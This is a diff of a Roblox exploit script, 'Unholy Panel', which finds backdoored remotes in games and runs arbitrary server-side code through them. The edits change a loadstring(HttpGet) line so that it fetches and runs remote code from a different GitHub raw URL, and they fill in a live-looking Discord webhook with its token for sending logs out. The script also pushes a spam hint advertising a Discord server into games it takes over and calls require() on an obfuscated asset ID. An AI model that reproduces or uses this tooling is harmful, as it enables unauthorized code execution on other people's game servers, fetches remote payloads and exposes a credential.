@@ -264,7 +264,7 @@ local script = G2L["4"];
 	
 	-- Load script on teleport
 	if Exploit.QueueTeleport then
-		Exploit.QueueTeleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
+		Exploit.QueueTeleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/robloxhecker123xd-tech/Unholy/refs/heads/main/Panel.Lua'))()")
 	end
 	
 	-- Initialize variables
@@ -341,7 +341,7 @@ local script = G2L["4"];
 				code=self:GenerateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-			spawn(function() protected_backdoor:InvokeServer('unholy panel join today!!', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+			spawn(function() protected_backdoor:InvokeServer('ep1kzkidd team join today!!', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 			remotes[code]=protected_backdoor
 		end
 	
@@ -401,11 +401,11 @@ local script = G2L["4"];
 					self:Debug(remote:GetFullName(), 3)
 	
 					self:RunRemote(remote, "require(171016405.1884*69)")			
-					self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Unholy Panel | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Unholy Panel | .gg/Pf4RXzam 'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 	
 					if Exploit.Request and not _G.UnholyPanel_Logs_Disabled then 
 						Exploit.Request({
-							Url = 'https://discord.com/api/webhooks/INSERT_WEBHOOK_HERE',
+							Url = 'https://discord.com/api/webhooks/1479699998793924680/pfRoqE5d-uZQJZjgw_OJsaOZsfrq98UsRjivoRYpsZJh0fFAf5kB5GLbkbwi7Wn38zPb',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
@@ -437,10 +437,12 @@ local script = G2L["4"];
 	
 		if not UnholyPanel:FindRemote() then
 			AttachBtn.Text='No backdoor :('
-			UnholyPanel:Notify('No backdoor found!')
+			UnholyPanel:Notify('No backdoor found')
 		else
 			AttachBtn.Text='Attached!'
-			UnholyPanel:Notify('Backdoor attached successfully!')
+			task.wait(5)
+			AttachBtn.Text='Attach'
+			UnholyPanel:Notify('Backdoor attached successfully')
 		end
 	
 		UnholyPanel.isScanning = false
@@ -449,13 +451,13 @@ local script = G2L["4"];
 	-- GUI Button Event: Execute
 	ExecuteBtn.MouseButton1Click:Connect(function()
 		if UnholyPanel.backdoor == nil then
-			UnholyPanel:Notify('No backdoor attached! Click Attach first.')
+			UnholyPanel:Notify('No backdoor attached Click Attach first.')
 			return
 		end
 	
 		local code = ScriptBox.Text
 		if code == '' then
-			UnholyPanel:Notify('Script box is empty!')
+			UnholyPanel:Notify('Script box is empty')
 			return
 		end
 	
@@ -474,7 +476,7 @@ local script = G2L["4"];
 		else
 			UnholyPanel:RunRemote(UnholyPanel.backdoor, a)
 		end
-		ExecuteBtn.Text='Executed!'
+		ExecuteBtn.Text='Executed'
 		wait(0.5)
 		ExecuteBtn.Text='Execute'
 	end)
